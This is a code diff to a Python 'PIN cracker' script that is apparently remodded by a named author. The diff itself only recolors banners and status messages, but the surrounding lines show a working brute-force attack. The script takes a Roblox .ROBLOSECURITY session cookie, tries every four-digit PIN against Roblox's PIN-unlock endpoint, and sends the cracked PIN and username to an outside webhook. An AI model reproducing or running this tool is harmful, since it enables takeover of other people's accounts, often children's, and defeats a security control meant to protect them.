@@ -8,18 +8,18 @@ def is_cookie_valid(cookie):
 
 pingEveryone = True
 print('')
-print('================================================\n	\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN	\u001B[37m \n================================================')
+print('\u001B[35m█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\u001B[37m\n================================================\n	\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN	\u001B[37m \n================================================')
 print('')
 print('\u001B[34m[COOKIE]:\u001B[37m')
 cookie = input()
 
 if not is_cookie_valid(cookie):
-    print("	\u001B[31mInvalid cookie!	\u001B[37m")
+    print("	\u001B[31m[INVALID COOKIE]\u001B[37m")
     exit()
 
 os.system("clear")
 print('')
-print('	\u001B[36m[WEBHOOK]:\u001B[37m')
+print('\u001B[36m[WEBHOOK]:\u001B[37m')
 webhook = input()
 os.system("clear")
 print('')
@@ -29,7 +29,7 @@ os.system("clear")
 ping = '@everyone' if pingEveryone.lower() in ['y', 'yes'] else 'Pin Successfully Cracked!'
 os.system("clear")
 
-print('''Cracker Has Started.''')
+print('''[CRACKER STARTED]''')
 
 url = 'https://auth.roblox.com/v1/account/pin/unlock'
 token = requests.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY": cookie})
@@ -42,7 +42,7 @@ for i in range(9999):
         payload = {'pin': pin}
         r = requests.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": cookie})
         if 'unlockedUntil' in r.text:
-            print(f'[SUCCESSFULY CRACKED] PIN: {pin}')
+            print(f'\u001B[32m[SUCCESSFULY CRACKED] PIN:\u001B[37m  \u001B[34m {pin} \u001B[37m')
             username = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie}).json()['name']
             data = {
                 "content": ping,
@@ -71,7 +71,7 @@ for i in range(9999):
             break
 
         elif 'Incorrect' in r.text:
-            print(f"Tried: {pin}, Incorrect!")
+            print(f"\u001B[32m[TRIED]:\u001B[37m {pin}, \u001B[31mIncorrect!\u001B[37m")
             time.sleep(10)  
     except Exception as e:
         print(f'Error: {e}')
